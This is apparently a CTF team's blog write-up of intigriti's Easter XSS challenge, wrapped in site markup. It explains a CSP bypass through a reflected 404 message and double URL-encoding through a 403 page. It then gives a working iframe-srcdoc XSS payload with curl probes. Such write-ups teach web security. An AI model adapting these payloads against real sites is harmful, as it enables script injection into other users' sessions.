@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <!-- title will be injected from _config.yml -->
+  <!-- Stylesheets -->
+  
+  <link rel="stylesheet" href="/assets/css/bootstrap.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="stylesheet" href="/assets/css/responsive.css">
+  <link rel="stylesheet" href="/assets/css/import_custom.css">
+
+  <link rel="shortcut icon" href="images/favicon.png" type="image/x-icon">
+  <link rel="icon" href="images/favicon.png" type="image/x-icon">
+
+  <!-- Responsive -->
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  <!--[if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.js"></script><![endif]-->
+  <!--[if lt IE 9]><script src="js/respond.js"></script><![endif]--><!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Easter XSS Challenge | LetzPwn - Luxembourgish CTF Team</title>
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="Easter XSS Challenge" />
+<meta name="author" content="Alain K." />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description" />
+<meta property="og:description" content="Description" />
+<link rel="canonical" href="/writeup/2020/04/13/eastern_xss_challenge.html" />
+<meta property="og:url" content="/writeup/2020/04/13/eastern_xss_challenge.html" />
+<meta property="og:site_name" content="LetzPwn - Luxembourgish CTF Team" />
+<meta property="og:image" content="/website.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-04-13T19:00:05+00:00" />
+<script type="application/ld+json">
+{"description":"Description","headline":"Easter XSS Challenge","dateModified":"2020-04-13T19:00:05+00:00","datePublished":"2020-04-13T19:00:05+00:00","image":"/website.png","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/writeup/2020/04/13/eastern_xss_challenge.html"},"url":"/writeup/2020/04/13/eastern_xss_challenge.html","author":{"@type":"Person","name":"Alain K."},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link type="application/atom+xml" rel="alternate" href="/feed.xml" title="LetzPwn - Luxembourgish CTF Team" /></head><body>
+  <div class="page-wrapper"><!-- Main Header -->
+<header class="main-header">
+  <!-- Header Top -->
+  <div class="header-top">
+    <div class="auto-container clearfix">
+
+      <div class="top-left clearfix">
+        <ul class="info-list">
+          <li>The first Luxembourgish CTF Team</li>
+        </ul>
+      </div>
+
+      <div class="top-right">
+        <ul class="social-icons">
+          <li><a href="https://twitter.com/LetzPwn"><span class="fab fa-twitter"></span></a></li>
+          <li><a href="https://discord.gg/Qjt5zUc"><span class="fab fa-discord"></span></a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- Header Upper -->
+  <div class="header-upper">
+    <div class="inner-container">
+      <div class="auto-container clearfix">
+        <!--Logo-->
+        <div class="logo-outer">
+          <div class="logo"><a href="/"><img src="/assets/images/logo.png" alt=""
+                title="Gamon - Digital Gaming and Esports HTML Template" style="max-width: 260px;"></a></div>
+        </div>
+
+        <!--Nav Box-->
+        <div class="nav-outer clearfix">
+          <!--Mobile Navigation Toggler-->
+          <div class="mobile-nav-toggler"><span class="icon flaticon-menu-1"></span></div>
+
+          <!-- Main Menu -->
+          <nav class="main-menu navbar-expand-md navbar-light">
+            <div class="collapse navbar-collapse show clearfix" id="navbarSupportedContent">
+              <ul class="navigation clearfix pull-left">
+                
+                
+                <li class=""><a href="/">Home</a>
+                </li>
+                
+                
+                
+                <li class=""><a href="/about_us.html">About Us</a>
+                </li>
+                
+                
+                
+                <li class=""><a href="/events.html">News & CTFs</a>
+                </li>
+                
+                
+              </ul>
+
+                <ul class="navigation clearfix pull-right">
+                  
+                    
+                    <li class=""><a href="/writeups.html">Writeups</a> </li>
+                    
+                  
+                    
+                    <li class=""><a href="/contact.html">Contact</a> </li>
+                    
+                  
+                </ul>
+            </div>
+          </nav>
+          <!-- Main Menu End-->
+        </div>
+      </div>
+    </div>
+  </div>
+  <!--End Header Upper-->
+
+  <!-- Sticky Header  -->
+  <div class="sticky-header">
+    <div class="auto-container clearfix">
+      <!--Logo-->
+      <div class="logo pull-left">
+        <a href="/" title=""><img src="/assets/images/logo.png" style="max-width:100px;" alt="" title=""></a>
+      </div>
+      <!--Right Col-->
+      <div class="pull-right">
+        <!-- Main Menu -->
+        <nav class="main-menu clearfix">
+          <!--Keep This Empty / Menu will come through Javascript-->
+        </nav><!-- Main Menu End-->
+      </div>
+    </div>
+  </div><!-- End Sticky Menu -->
+
+  <!-- Mobile Menu  -->
+  <div class="mobile-menu">
+    <div class="menu-backdrop"></div>
+    <div class="close-btn"><span class="icon flaticon-close"></span></div>
+
+    <nav class="menu-box">
+      <div class="nav-logo"><a href="/"><img src="/assets/images/logo.png" alt="" title=""></a></div>
+      <div class="menu-outer">
+        <!--Here Menu Will Come Automatically Via Javascript / Same Menu as in Header-->
+      </div>
+      <!--Social Links--
+      <div class="social-links">
+        <ul class="clearfix">
+          <li><a href="#"><span class="fab fa-twitter"></span></a></li>
+          <li><a href="#"><span class="fab fa-facebook-square"></span></a></li>
+          <li><a href="#"><span class="fab fa-pinterest-p"></span></a></li>
+          <li><a href="#"><span class="fab fa-instagram"></span></a></li>
+          <li><a href="#"><span class="fab fa-youtube"></span></a></li>
+        </ul>
+      </div>-->
+    </nav>
+  </div><!-- End Mobile Menu -->
+</header>
+<!--Page Title-->
+<div itemscope itemtype="http://schema.org/BlogPosting">
+  <section class="page-banner" style="padding-bottom: 40px; background-image:url(/assets/images/background/1.png);">
+    <div class="auto-container">
+      <div class="inner-container clearfix">
+        <ul class="bread-crumb clearfix">
+          <li><a href="/index.html">Home</a></li> 
+          <li><a href="/writeups.html">Writeups</a></li>
+          <li><a href="#">intigriti</a></li> <!-- TODO: correct href-->
+          <li itemprop="name headline">Easter XSS Challenge Writeup</li>
+        </ul>
+        <h1>Easter XSS Challenge Writeup</h1><ul class="custom-author">
+                <li>By <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span
+                      class="p-author h-card" itemprop="name">Alain K.</span></span>
+                </li>
+              </ul>
+              <br/><div class="custom-date">Apr 13, 2020</div>
+        <ul class="tags">
+          <li>Solves:  teams</li>
+          <li>Source: <a href="" target="_blank" rel="noopener noreferrer"></a></li>
+        </ul>
+    </div>
+  </section>
+  <!--End Page Title-->
+
+  <!--Sidebar Page Container-->
+  <div class="sidebar-page-containe" style="padding-top: 40px; background-color:#202020">
+    <div class="auto-container">
+      <div class="row clearfix">
+
+        <!--Content Side / Blog Detail-->
+        <div class="content-side col-lg-8 col-md-12 col-sm-12">
+          <div class="blog-detail">
+            <div class="lower-content writeup-content awsm" style="padding-top: 0px;">
+              <p> <h2 id="description">Description</h2>
+
+<p>Every once in a while, <a href="https://www.intigriti.com/">intigriti</a> drops a new XSS challenge. (Follow them on <a href="https://twitter.com/intigriti">Twitter</a> to know when the next one drops). The challenge had a pretty straightforward description:</p>
+
+<blockquote>
+  <p>Find a way to execute arbitrary javascript on this page and win a Burp Suite Pro License.</p>
+</blockquote>
+
+<p>With the following conditions:</p>
+
+<ul>
+  <li>Should work on the latest version of Firefox or Chrome</li>
+  <li>Should bypass CSP</li>
+  <li>Should execute the following JS: alert(document.domain)</li>
+  <li>Should be executed on this page, on this domain</li>
+  <li>Should work without user interaction (no self XSS) or MiTM</li>
+</ul>
+
+<h2 id="analysis">Analysis</h2>
+
+<h3 id="appearence--behaviour">Appearence &amp; Behaviour</h3>
+
+<p><img src="website.png" alt="Website Screenshot" /></p>
+
+<p>The website was very simple. It had one simple functionality, which was for the user to select the title of a slogan in a drop-down and then the whole slogan text would appear below the drop-down.</p>
+
+<p>One can also notice that the location hash changed depending on the selection in the drop-down. Also, when loading the website with a correct hash, that slogan text would appear without user interaction.</p>
+
+<h3 id="source-code">Source Code</h3>
+<p>Next, I looked at the source code. The HTML was very simple and had nothing interesting to exploit. However, it included the following script:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">hash</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="nx">hash</span><span class="p">){</span>
+	<span class="nx">displayReason</span><span class="p">(</span><span class="nx">hash</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">reasons</span><span class="dl">"</span><span class="p">).</span><span class="nx">onchange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
+<span class="k">if</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">value</span> <span class="o">!=</span> <span class="dl">""</span><span class="p">)</span>
+	<span class="nx">displayReason</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">reasonLoaded</span> <span class="p">()</span> <span class="p">{</span>
+	<span class="kd">var</span> <span class="nx">reason</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">reason</span><span class="dl">"</span><span class="p">);</span>
+	<span class="nx">reason</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">unescape</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span> <span class="c1">//❶</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">displayReason</span><span class="p">(</span><span class="nx">reason</span><span class="p">){</span>
+	<span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span> <span class="o">=</span> <span class="nx">reason</span><span class="p">;</span>
+	<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+	<span class="nx">xhr</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">load</span><span class="dl">"</span><span class="p">,</span> <span class="nx">reasonLoaded</span><span class="p">);</span>
+	<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span><span class="s2">`./reasons/</span><span class="p">${</span><span class="nx">reason</span><span class="p">}</span><span class="s2">.txt`</span><span class="p">);</span> <span class="c1">//❷</span>
+	<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Here it starts getting interesting. <code class="highlighter-rouge">displayReason</code> is called with the location hash as parameter. It will then load a text file with the hash’s name using xhr ❷ and finally <code class="highlighter-rouge">reasonLoaded</code> will be executed, which renders the content of that <em>unescaped</em> text file using <em>innerHTML</em> ❶.</p>
+
+<p>Trying to load a file that doesn’t exist (<code class="highlighter-rouge">https://challenge.intigriti.io/reasons/20.txt</code>) we get the following error:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>404 - 'File "20.txt" was not found in this folder.'
+</code></pre></div></div>
+
+<p>It’s interesting that the filename that doesn’t exist gets reflected in the error message.</p>
+
+<h3 id="http-headers">HTTP Headers</h3>
+
+<p>When trying to execute XSS, it is important to know which CSP is set. The CSP header allows us to know what resources are possible to load. As a hacker this can “help” us reduce the attack surface. For this challenge, the CSP header is set to:</p>
+
+<p><code class="highlighter-rouge">content-security-policy: default-src 'self'</code></p>
+
+<p>This means, that no resources (scripts, images, …) from other hosts can be loaded. Also we can’t execute own inline scripts (<code class="highlighter-rouge">&lt;script&gt;alert(1)&lt;/script&gt;</code>, <code class="highlighter-rouge">document.location=javascript:alert(1)</code>, <code class="highlighter-rouge">&lt;img src onerror=alert(1)&gt;</code>). This leaves us with the only option to load js using <code class="highlighter-rouge">&lt;scipt src="blub.js"&gt;</code> where <code class="highlighter-rouge">blub.js</code> is hosted on the same host as the website itself. So trying to load scripts from a server we control is useless.</p>
+
+<p>Another interesting header to look at is the <code class="highlighter-rouge">X-Frame-Options</code> header. Here it is not set, meaning we could load the website inside an iframe. This can be useful sometimes to change the hash location during run-time without user interaction.</p>
+
+<h2 id="attack">Attack</h2>
+<p>OK, now that I gathered enough information, I started with the interesting part: the attack! :)</p>
+
+<p>The code at ❶ is the only part where dynamic content is added to the website. So this has to be the sink where our payload needs to be written.</p>
+
+<p>We found out in the analysis that the filename we try to gather gets reflected in the error message. Let’s try to reflect our own html elements:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://challenge.intigriti.io/reasons/%3Cimg%20src=x%3E.txt
+
+404 - 'File "_3Cimg_20src=x_3E.txt" was not found in this folder.'
+</code></pre></div></div>
+
+<p>Huh, what happened here? They seem to filter the user input. Precisely, they replace all occurrences of <code class="highlighter-rouge">%</code> with <code class="highlighter-rouge">_</code>. Dang, we need <code class="highlighter-rouge">&lt;</code> and <code class="highlighter-rouge">&gt;</code> to reflect our own HTML. This is impossible without URL-encoding them. Maybe their filtering has some weak spots. Let’s try double encoding, just to be sure:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://challenge.intigriti.io/reasons/%253Cimg%2520src%253Dx%253E.txt
+
+404 - 'File "_253Cimg_2520src_253Dx_253E.txt" was not found in this folder.'
+</code></pre></div></div>
+
+<p>Too bad, would have been too easy. But hey, even if I can’t reflect my own html elements. Maybe I can use this reflection later for generating my own js code that is hosted on their site. <code class="highlighter-rouge">404 - 'File "%s" was not found in this folder.'</code> seems to be the static string. <code class="highlighter-rouge">404 -</code> is a valid js subtraction if we provide a correct right hand expression. As we control <code class="highlighter-rouge">%s</code>, maybe we can close the single quote before “File” and then execute our own js? Let’s try:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl "https://challenge.intigriti.io/reasons/';alert(1);a='"
+
+404 - 'File "';alert(1);a='" was not found in this folder.'
+</code></pre></div></div>
+
+<p>Nice, they don’t escape the single quote so we manage to generate our own valid javascript code!</p>
+
+<p>Now I found a way to bypass the CSP by using <code class="highlighter-rouge">&lt;script src="reasons/';alert(1);a='"&gt;</code> but I still have no way to include that script tag inside the HTML…</p>
+
+<p>After playing around for a while, I tried to access <code class="highlighter-rouge">.htaccess</code> and to my surprise I received a different response than the typical <code class="highlighter-rouge">File was not found in this folder</code>:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE  HTML  PUBLIC  "-//IETF//DTD HTML 2.0//EN"&gt;</span>
+<span class="nt">&lt;html&gt;&lt;head&gt;</span>
+<span class="nt">&lt;title&gt;</span>403 Forbidden<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;&lt;body&gt;</span>
+<span class="nt">&lt;h1&gt;</span>Forbidden<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;p&gt;</span>You don't have permission to access /.htaccess on this server.<span class="nt">&lt;/p&gt;</span>
+</code></pre></div></div>
+
+<p>Hmm, maybe it’s possible to reflect more than the file name with the query string: <code class="highlighter-rouge">./htacess?reflect</code></p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://challenge.intigriti.io/.htaccess?reflect
+
+<span class="cp">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;</span>
+<span class="nt">&lt;html&gt;&lt;head&gt;</span>
+<span class="nt">&lt;title&gt;</span>403 Forbidden<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;&lt;body&gt;</span>
+<span class="nt">&lt;h1&gt;</span>Forbidden<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;p&gt;</span>You don't have permission to access /.htaccess?reflect on this server.<span class="nt">&lt;/p&gt;</span>
+</code></pre></div></div>
+
+<p>Nice, let’s try if we manage to reflect our own HTML here:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://challenge.intigriti.io/.htaccess?%3Cimg%20src=x%3E
+
+<span class="cp">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;</span>
+<span class="nt">&lt;html&gt;&lt;head&gt;</span>
+<span class="nt">&lt;title&gt;</span>403 Forbidden<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;&lt;body&gt;</span>
+<span class="nt">&lt;h1&gt;</span>Forbidden<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;p&gt;</span>You don't have permission to access /.htaccess?<span class="ni">&amp;lt;</span>img src=x<span class="ni">&amp;gt;</span> on this server.<span class="nt">&lt;/p&gt;</span>
+</code></pre></div></div>
+
+<p>Dang, here they correctly html escape the <code class="highlighter-rouge">&lt;</code> and <code class="highlighter-rouge">&gt;</code>. But wait! In ❶ they use the <code class="highlighter-rouge">unescape</code>function before setting the innerHTML. So we should be able to double escape our payload and itshould get unescaped once by the script that shows the forbidden page and once again by the <code class="highlighter-rouge">unescape</code> call. Let’s try it all out, by appending <code class="highlighter-rouge">.htaccess</code> with our double-encoded image tag to the location hash:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://challenge.intigriti.io/#.htaccess?%253Cimg%2520src%253Dx%253E
+</code></pre></div></div>
+
+<p><img src="html.png" alt="Successful HTML reflection" /></p>
+
+<p>What have we got here! Our own html on their page! Now that we have our 2 building blocks: Our own HTML and a CSP bypass, let’s try to combine them:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://challenge.intigriti.io/#.htaccess?%253Cscript%2520src%253D%2522reasons%252F%2527%253Balert%25281%2529%253Ba%253D%2527%2522%253E%253C%252Fscript%253E
+
+(the long encoded string is <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"reasons/';alert(1);a='"</span><span class="nt">&gt;&lt;/script&gt;</span> double url-encoded.)
+</code></pre></div></div>
+
+<p>But nothing happens… I completely forgot: <code class="highlighter-rouge">innerHTML</code> doesn’t execute script tags anymore since HTML5. I know of some bypasses using <code class="highlighter-rouge">&lt;img src onerror="alert(1)"&gt;</code> but these were all inline scripts which got all blocked by the CSP… Maybe I can include an iframe with a script tag that will still execute using innerHTML?</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">srcdoc=</span><span class="s">"&lt;script src=reasons/';alert(1);a='&gt;&lt;/script&gt;"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+</code></pre></div></div>
+
+<p>Double encoding it and appending it to <code class="highlighter-rouge">.htaccess</code>:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://challenge.intigriti.io/#.htaccess?%253Ciframe%2520srcdoc%253D%2522%253Cscript%2520src%253Dreasons%252F%2527%253Balert%25281%2529%253Ba%253D%2527%253E%253C%252Fscript%253E%2522%253E%253C%252Fiframe%253E
+</code></pre></div></div>
+
+<p><img src="finished.png" alt="Final exploit" /></p>
+
+<h2 id="lessons-learned">Lessons learned</h2>
+
+<ul>
+  <li>Even if you find something that isn’t quite useful yet, it might come in handy later</li>
+  <li>Check and understand the CSP policy</li>
+  <li>Double encoding to the rescue</li>
+</ul>
+</p>
+            </div>
+          </div>
+
+          <!-- Other Options -->
+          <div class="post-share-options clearfix">
+            <!--
+            <div class="pull-left">
+              <ul class="tags">
+                <li><a href="#">Gaming</a></li>
+                <li><a href="matches.html">Matches</a></li>
+                <li><a href="#">Players</a></li>
+              </ul>
+            </div>
+            -->
+            <!--
+            <div class="social-links pull-right">
+              <ul class="social-links">
+                <li><a href="#"><span class="fab fa-twitter"></span></a></li>
+                <li><a href="#"><span class="fab fa-facebook-square"></span></a></li>
+                <li><a href="#"><span class="fab fa-pinterest-p"></span></a></li>
+                <li><a href="#"><span class="fab fa-instagram"></span></a></li>
+              </ul>
+            </div>
+            -->
+          </div>
+        </div>
+
+        <!--Sidebar Side-->
+        <div class="sidebar-side col-lg-4 col-md-12 col-sm-12">
+          <aside class="sidebar">
+
+            <!-- Tags Widget -->
+            <div class="sidebar-widget popular-tags">
+              <div class="widget-content">
+                <h4 class="sidebar-title">Task categories</h4>
+                
+                  <a href="#">xss</a>
+                
+                  <a href="#">csp</a>
+                
+                  <a href="#">web</a>
+                
+              </div>
+            </div>
+
+            <!-- Search -->
+            <!--
+            <div class="sidebar-widget search-box">
+              <form method="post" action="contact.html">
+                <div class="form-group">
+                  <input type="search" name="search-field" value="" placeholder="Search" required>
+                  <button type="submit"><span class="icon fa fa-search"></span></button>
+                </div>
+              </form>
+            </div>
+            -->
+
+            <!-- Post Widget -->
+            <div class="sidebar-widget popular-posts">
+              <div class="widget-content">
+                <h4 class="sidebar-title">Recent Writeups</h4>
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                <article class="post">
+                  <div class="post-inner">
+                    
+                    
+                    <figure class="post-thumb"><a href="/writeup/2019/10/27/Numtonce.html"><img src="/writeup/2019/10/27/website.png"
+                          alt=""></a></figure>
+                    <div class="post-info">Apr 13, 2020</div>
+                    <div class="text"><a href="/writeup/2019/10/27/Numtonce.html">Numtonce</a></div>
+                  </div>
+
+                </article>
+                
+                
+                
+                <article class="post">
+                  <div class="post-inner">
+                    
+                    
+                    <figure class="post-thumb"><a href="/writeup/2020/02/05/Draw_with_us.html"><img src="/writeup/2020/02/05/website.png"
+                          alt=""></a></figure>
+                    <div class="post-info">Apr 13, 2020</div>
+                    <div class="text"><a href="/writeup/2020/02/05/Draw_with_us.html">Draw with us</a></div>
+                  </div>
+
+                </article>
+                
+                
+              </div>
+            </div>
+
+            <!-- Category Widget -->
+            <!--
+            <div class="sidebar-widget categories">
+              <div class="widget-content">
+                <h4 class="sidebar-title">Categories</h4>
+                <ul class="blog-categories">
+                  <li><a href="blog-single.html">Gaming</a></li>
+                  <li><a href="blog-single.html">Matches</a></li>
+                  <li><a href="blog-single.html">Video games</a></li>
+                  <li><a href="blog-single.html">Esports</a></li>
+                  <li><a href="blog-single.html">Champions</a></li>
+                </ul>
+              </div>
+            </div>
+            -->
+          </aside>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<!-- End Sidebar Page Container -->
+
+	<!-- Main Footer -->
+  <footer class="main-footer">
+    	<div class="auto-container">
+        	<!--Widgets Section-->
+            <div class="widgets-section">
+            	<div class="row clearfix">
+                	
+                    <!--Column-->
+                    <div class="column col-lg-4 col-md-6 col-sm-12">
+						<div class="footer-widget logo-widget">
+							<div class="logo">
+                            	<a href="/index.html"><img src="/assets/images/logo.png" alt="" /></a>
+                            </div>
+							<div class="text"></div>
+						</div>
+					</div>
+					
+					<!--Column-->
+                    <div class="column col-lg-4 col-md-6 col-sm-12">
+						<div class="footer-widget links-widget">
+							<div class="widget-content">
+								<div class="footer-title">
+									<h2>Links</h2>
+								</div>
+								<div class="row clearfix">
+									<div class="column col-lg-6 col-md-6 col-sm-12">
+										<ul class="list">
+											<li><a href="/about_us.html">About</a></li>
+											<li><a href="/members.html">Our Team</a></li>
+											<li><a href="/events.html">News and CTFs</a></li>
+											<li><a href="/contact.html">Contact</a></li>
+										</ul>
+									</div>
+									<div class="column col-lg-6 col-md-6 col-sm-12">
+										<ul class="list">
+											<li><a href="/contact.html">Help & Support</a></li>
+											<li><a href="/privacy_policy.html">Privacy Policy</a></li>
+										</ul>
+									</div>
+								</div>
+							</div>	
+						</div>
+					</div>
+					
+					<!--Column                    <div class="column col-lg-4 col-md-6 col-sm-12">
+						<div class="footer-widget newsletter-widget">
+							<div class="footer-title">
+                            	<h2>Newsletter</h2>
+                            </div>
+							<div class="text">Subsrcibe us now to get the latest news and updates</div>
+							<div class="newsletter-form">
+                                <form method="post" action="contact.html">
+                                    <div class="form-group clearfix">
+                                        <input type="email" name="email" value="" placeholder="Email address" required>
+                                        <button type="submit" class="theme-btn newsletter-btn"><span class="fas fa-envelope"></span></button>
+                                    </div>
+                                </form>
+                            </div>
+						</div>
+					</div>
+					-->
+
+				</div>
+			</div>
+		</div>
+		
+		<!-- Footer Bottom -->
+		<div class="footer-bottom">
+			<div class="auto-container">
+				<!--Scroll to top-->
+				<div class="scroll-to-top scroll-to-target" data-target="html"><span class="flaticon-up-arrow"></span></div>
+				<!--Scroll to top-->
+				<div class="row clearfix">
+					<!-- Column -->
+					<div class="column col-lg-6 col-md-12 col-sm-12">
+						<div class="copyright">&copy; Copyrights, 2019 All Rights Reserved</div>
+					</div>
+					<!-- Column -->
+					<div class="column col-lg-6 col-md-12 col-sm-12">
+						<ul class="social-icons">
+							<li><a href="https://twitter.com/letzpwn"><span class="fab fa-twitter"></span></a></li>
+						</ul>
+					</div>
+				</div>
+			</div>
+		</div>
+		
+  </footer>
+  
+</div>
+<script src="/assets/js/jquery.js"></script>
+<script src="/assets/js/popper.min.js"></script>
+<script src="/assets/js/bootstrap.min.js"></script>
+<script src="/assets/js/jquery-ui.js"></script>
+<script src="/assets/js/jquery.fancybox.js"></script>
+<script src="/assets/js/owl.js"></script>
+<script src="/assets/js/appear.js"></script>
+<script src="/assets/js/wow.js"></script>
+<script src="/assets/js/scrollbar.js"></script>
+<script src="/assets/js/script.js"></script></body>
+
+</html>
